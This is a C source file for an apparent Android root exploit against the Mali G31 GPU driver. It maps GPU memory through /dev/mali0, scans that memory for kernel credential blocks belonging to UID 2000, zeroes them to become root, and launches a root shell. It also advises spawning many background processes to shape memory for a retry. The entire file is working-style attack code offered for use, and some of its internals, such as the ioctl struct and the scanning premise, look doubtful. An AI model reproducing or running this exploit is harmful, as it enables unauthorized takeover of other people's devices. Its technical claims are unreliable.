#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

// Mali G31 (Bifrost) constants
#define KBASE_IOCTL_TYPE 'k'
#define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_mem_alloc)
#define TARGET_UID 2000
#define SCAN_SIZE (16 * 1024 * 1024) // 16MB scan window

struct kbase_ioctl_mem_alloc {
    uint32_t va_pages;
    uint32_t commit_pages;
    uint64_t extent;
    uint64_t flags;
    uint32_t gpu_va; 
};

void check_root() {
    if (getuid() == 0) {
        printf("\n[!!!] SUCCESS: ELEVATED TO ROOT [!!!]\n");
        // Start Shizuku if available
        system("sh /data/user/0/moe.shizuku.privileged.api/start.sh 2>/dev/null");
        // Drop into shell
        system("/system/bin/sh");
        exit(0);
    }
}

int main() {
    printf("[*] Opening Mali device node...\n");
    int fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) {
        fprintf(stderr, "[-] Error: Could not open /dev/mali0 (%s). Check permissions.\n", strerror(errno));
        return 1;
    }

    struct kbase_ioctl_mem_alloc alloc = {
        .va_pages = SCAN_SIZE / 4096,
        .commit_pages = SCAN_SIZE / 4096,
        .flags = 0x2000 // RW permissions
    };

    printf("[*] Allocating %d MB of GPU-mapped memory...\n", SCAN_SIZE / (1024*1024));
    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &alloc) != 0) {
        fprintf(stderr, "[-] IOCTL failed: %s. Driver may be patched or busy.\n", strerror(errno));
        return 1;
    }

    uint32_t* mem = (uint32_t*)mmap(NULL, SCAN_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, alloc.gpu_va);
    if (mem == MAP_FAILED) {
        perror("[-] Mmap failed");
        return 1;
    }

    printf("[*] Memory Mapped. Starting Aggressive Scanner...\n");

    // The "Foolproof" Loop
    for (size_t i = 0; i < (SCAN_SIZE / 4) - 16; i++) {
        // Pattern: [Usage > 0][UID 2000][GID 2000][SUID 2000][SGID 2000]
        // 32-bit kernels usually have these as consecutive 4-byte words
        if (mem[i+1] == TARGET_UID && mem[i+2] == TARGET_UID && mem[i+3] == TARGET_UID) {
            
            printf("[+] Match found at offset 0x%zX! Attempting Root Flip...\n", i * 4);
            
            // Try to overwrite the credentials block (UID, GID, SUID, SGID, EUID, EGID)
            for (int j = 1; j <= 8; j++) {
                mem[i+j] = 0; 
            }
            
            // Check if it worked
            check_root();
        }

        // Progress indicator every 1MB
        if (i % (256 * 1024) == 0 && i > 0) {
            printf("[...] Scanned %zu MB...\n", (i * 4) / (1024*1024));
        }
    }

    printf("[-] Scan finished. No targets found in this memory chunk.\n");
    printf("[*] Suggestion: Run 'for i in {1..150}; do tail -f /dev/null & done' and retry.\n");

    munmap(mem, SCAN_SIZE);
    close(fd);
    return 0;
}
